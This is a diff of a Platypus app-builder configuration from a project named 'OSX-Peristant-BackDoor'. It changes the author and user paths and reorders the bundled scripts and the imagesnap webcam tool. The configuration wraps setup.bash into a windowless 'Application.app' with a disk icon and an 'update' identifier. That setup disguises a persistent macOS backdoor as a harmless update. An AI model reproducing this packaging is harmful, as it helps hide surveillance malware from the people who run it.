@@ -9,19 +9,19 @@
 	<key>Authentication</key>
 	<true/>
 	<key>Author</key>
-	<string>tend</string>
+	<string>tutti</string>
 	<key>BundledFiles</key>
 	<array>
-		<string>/Users/tend/Documents/GitHub/OSX-Peristant-BackDoor/imagesnap/imagesnap</string>
-		<string>/Users/tend/Documents/GitHub/OSX-Peristant-BackDoor/woffice.py</string>
-		<string>/Users/tend/Documents/GitHub/OSX-Peristant-BackDoor/woffice.sh</string>
+		<string>/Users/tutti/Documents/GitHub/OSX-Peristant-BackDoor/woffice.py</string>
+		<string>/Users/tutti/Documents/GitHub/OSX-Peristant-BackDoor/woffice.sh</string>
+		<string>/Users/tutti/Documents/GitHub/OSX-Peristant-BackDoor/imagesnap/imagesnap</string>
 	</array>
 	<key>Creator</key>
 	<string>Platypus-5.3</string>
 	<key>DeclareService</key>
 	<false/>
 	<key>Destination</key>
-	<string>/Users/tend/Desktop/Application.app</string>
+	<string>/Users/tutti/Desktop/Application.app</string>
 	<key>DevelopmentVersion</key>
 	<false/>
 	<key>DocIconPath</key>
@@ -31,9 +31,9 @@
 	<key>ExecutablePath</key>
 	<string>/usr/local/share/platypus/ScriptExec</string>
 	<key>IconPath</key>
-	<string>/Users/tend/Documents/GitHub/OSX-Peristant-BackDoor/disk.icns</string>
+	<string>/Users/tutti/Documents/GitHub/OSX-Peristant-BackDoor/disk.icns</string>
 	<key>Identifier</key>
-	<string>org.tend.update</string>
+	<string>org.tutti.update</string>
 	<key>InterfaceType</key>
 	<string>None</string>
 	<key>InterpreterArgs</key>
@@ -57,7 +57,7 @@
 	<key>ScriptArgs</key>
 	<array/>
 	<key>ScriptPath</key>
-	<string>/Users/tend/Documents/GitHub/OSX-Peristant-BackDoor/setup.bash</string>
+	<string>/Users/tutti/Documents/GitHub/OSX-Peristant-BackDoor/setup.bash</string>
 	<key>StatusItemDisplayType</key>
 	<string>Text</string>
 	<key>StatusItemIcon</key>
